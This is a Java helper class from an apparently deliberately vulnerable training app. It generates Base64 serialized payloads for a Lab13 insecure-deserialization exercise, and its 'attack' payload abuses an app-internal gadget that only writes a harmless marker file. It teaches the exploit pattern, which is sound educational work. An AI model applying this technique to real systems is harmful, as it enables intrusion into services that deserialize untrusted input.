package hr.span.akademija.vulnshop.lab13.tools;

import hr.span.akademija.vulnshop.lab13.Cart;
import hr.span.akademija.vulnshop.lab13.CartItem;
import hr.span.akademija.vulnshop.lab13.DiagnosticsTask;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

/**
 * Lab13 – pomocni alat za polaznike: generira Base64 Java-serijalizirane payloade
 * koje se salju na {@code POST /api/lab13/cart/import}.
 *
 * Napomena (dopuna specifikacije, tocka 3): "gadget" klasa {@link DiagnosticsTask}
 * samo zapisuje BEZOPASNU tekstualnu marker datoteku na zadanu putanju; nema
 * pokretanja procesa ni mreznog pristupa. Payload za napad gradi se iskljucivo
 * iz klasa SAME aplikacije.
 *
 * Pokretanje: {@code main} ispisuje oba payloada (legitiman i napadacki) kako bi
 * ih polaznik mogao kopirati u {@code http/lab13.http}.
 */
public final class Lab13PayloadGenerator {

    private Lab13PayloadGenerator() {
    }

    /** Base64 serijalizirane legitimne kosarice s dvije stavke. */
    public static String legitimateCartPayload() {
        Cart cart = new Cart();
        cart.addItem(new CartItem("Laptop", 1));
        cart.addItem(new CartItem("Mis", 2));
        return serializeToBase64(cart);
    }

    /**
     * Base64 serijaliziranog {@link DiagnosticsTask} gadgeta koji ce pri
     * deserijalizaciji pokusati zapisati marker datoteku na {@code reportPath}.
     */
    public static String attackPayload(String reportPath) {
        DiagnosticsTask task = new DiagnosticsTask(reportPath, "PWNED_LAB13");
        return serializeToBase64(task);
    }

    public static String serializeToBase64(Serializable object) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
                oos.writeObject(object);
            }
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        } catch (Exception e) {
            throw new IllegalStateException("Serijalizacija nije uspjela", e);
        }
    }

    public static void main(String[] args) {
        String reportPath = System.getProperty("java.io.tmpdir") + "/lab13_pwned.txt";
        System.out.println("=== Lab13 – generator payloada ===");
        System.out.println();
        System.out.println("Legitimna kosarica (2 stavke), ocekivani odgovor itemCount=2:");
        System.out.println(legitimateCartPayload());
        System.out.println();
        System.out.println("Napadacki payload (DiagnosticsTask koji pokusava zapisati " + reportPath + "):");
        System.out.println(attackPayload(reportPath));
    }
}
